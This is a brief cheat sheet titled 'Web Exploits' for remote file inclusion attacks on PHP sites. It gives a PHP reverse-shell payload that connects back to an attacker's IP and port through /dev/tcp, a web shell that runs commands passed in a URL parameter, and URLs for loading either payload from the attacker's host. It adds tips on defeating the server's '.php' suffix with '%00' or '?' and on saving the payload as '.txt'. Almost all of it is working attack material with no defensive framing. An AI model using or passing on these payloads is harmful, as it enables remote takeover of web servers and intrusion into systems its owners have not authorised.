# Web Exploits

### Reverse shell

```php
<?php echo system("0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196"); ?>    #rev shell
http://<url>/index.php?page=http://<local host>.com/<file>.txt
```

### Remote execution

```php
<?php echo shell_exec($_GET['cmd']);?>
http://<url>/index.php?page=http://<local host>.com/<file>.txt&cmd="<command>"
```

### Notes

* Append `%00` or `?` at the end of the URL to prevent the server from appending `.php` at the end of the string
* Save the malicious file as `.txt` or else it will be executed by your local server instead of the remote target



